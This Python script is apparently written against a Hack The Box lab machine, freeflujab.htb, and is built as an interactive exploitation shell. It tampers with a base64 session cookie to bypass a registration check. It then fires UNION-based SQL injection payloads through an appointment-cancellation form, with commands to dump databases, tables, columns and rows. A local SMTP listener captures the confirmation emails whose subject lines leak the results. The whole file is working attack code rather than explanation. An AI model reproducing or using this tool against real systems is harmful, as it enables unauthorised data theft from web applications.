import asyncore
import base64
import re
import requests
import smtpd
import sys
import threading
import urllib.parse
from cmd import Cmd
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


pattern = re.compile("Subject: Flu Jab Appointment - Ref:(.*)\nMessage-ID", re.DOTALL)


class CustomSMTPServer(smtpd.SMTPServer):

    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        res = re.search(pattern, data.decode('utf-8')).group(1)
        if res == "":
             sys.stdout.write("Data is done. Ctrl-c to return to prompt\r")
             sys.stdout.flush()
        else:
            print(" "*50 + f"\r{res}")


class Terminal(Cmd):
    prompt = " "*50 + "\r> "

    def __init__(self):
        self.sleep_time = 0.2
        resp = requests.get('https://freeflujab.htb', verify=False)
        self.patient = re.search(r'Patient=([a-f0-9]{32});', resp.headers['Set-Cookie']).group(1)
        self.registered = re.search(r'Registered=(.*?); ', resp.headers['Set-Cookie']).group(1)
        self.registered = urllib.parse.quote(base64.b64encode(base64.b64decode(urllib.parse.unquote(self.registered)).decode().replace("Null","True").encode()))
        Cmd.__init__(self)

    def make_request(self, arg):
        cookies = dict(Patient=self.patient, Registered=self.registered)
        data = {"nhsnum": arg, "submit": "Cancel+Appointment"}
        burp = {'https': 'https://127.0.0.1:8080'}

        while True:
            try:
                resp = requests.post('https://freeflujab.htb/?cancel', verify=False,
                        cookies=cookies, data=data, proxies=burp)
                break
            except (requests.exceptions.SSLError, requests.exceptions.ConnectionError):
                print("Error - retrying")
                sleep(self.sleep_time)

    def do_dump_dbs(self, args):
        'Usage: dump_dbs [num dbs]'
        self.dump("' UNION select 1,2,TABLE_SCHEMA,4,5 FROM INFORMATION_SCHEMA.COLUMNS LIMIT {i},1; -- -", args)

    def do_dump_tables(self, args):
        'Usage: dump_data [db] [num rows]'
        args = args.split(' ')
        if len(args) < 2:
            print("Usage: dump_data [db] [num rows]")
            return
        self.dump(f"' UNION select 1,2,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),4,5 FROM INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = '{args[0]}' LIMIT {{i}},1; -- -", args[1])

    def do_dump_columns(self, args):
        'Usage: dump_data [db] [table] [num rows]'
        args = args.split(' ')
        if len(args) < 3:
            print("Usage: dump_data [db] [table] [num rows]")
            return
        self.dump(f"' UNION select 1,2,CONCAT(TABLE_NAME,':',COLUMN_NAME),4,5 FROM INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = '{args[0]}' and TABLE_NAME = '{args[1]}' LIMIT {{i}},1; -- -", args[2])

    def do_dump_data(self, args):
        'Usage: dump_data [db].[table] [columns] [num rows]'
        args = args.split(' ')
        if len(args) != 3:
            print("Usage: dump_data [db].[table] [columns] [num rows]")
            print("       columns are separated by :, no space")
            return
        cols = args[1].split(':')
        if len(cols) > 1:
            args[1] = "CONCAT(" + ",':',".join(cols) + ")"
        self.dump(f"' UNION select 1,2,{args[1]},4,5 FROM {args[0]} LIMIT {{i}},1; -- -", args[2])

    def dump(self, inject_args, args):
        try:
            num = int(args)
        except (TypeError, ValueError):
            default_num = 10
            #print(f"Unable to read number. Will use default, {default_num}")
            num = default_num
        for i in range(num):
            self.make_request(inject_args.format(i=i))
            sleep(self.sleep_time)
       
    def do_union(self, args):
        'Send request with UNION; provide column, table (or db.table), and offset'
        args = args.split(' ')

        if len(args) == 1:
            inject = f"' UNION select 1,2,{args[0]},4,5; -- -"
        elif len(args) == 2:
            inject = f"' UNION select 1,2,{args[0]},4,5 FROM {args[1]} LIMIT 1; -- -"
        elif len(args) == 3:
            inject = f"' UNION select 1,2,{args[0]},4,5 FROM {args[1]} LIMIT {args[2]},1; -- -"   
        else:
            print("Usage: union column [table] [offset]")

        self.make_request(inject)

    def do_raw(self, args):
        'Send raw argument'
        self.make_request(args)

    def do_exit(self, args):
        'exit'
        sys.exit()

    def cmdloop(self):
        while True:
            try:
                super(Terminal, self).cmdloop(intro="")
                break
            except KeyboardInterrupt:
                sys.stdout.write(" "*50 + "\r")
                sys.stdout.flush()
                sleep(1)


server = CustomSMTPServer(('0.0.0.0', 25), None)

loop_thread = threading.Thread(target=asyncore.loop, name="Asyncore Loop")
loop_thread.daemon = True
loop_thread.start()

term = Terminal()
term.cmdloop()
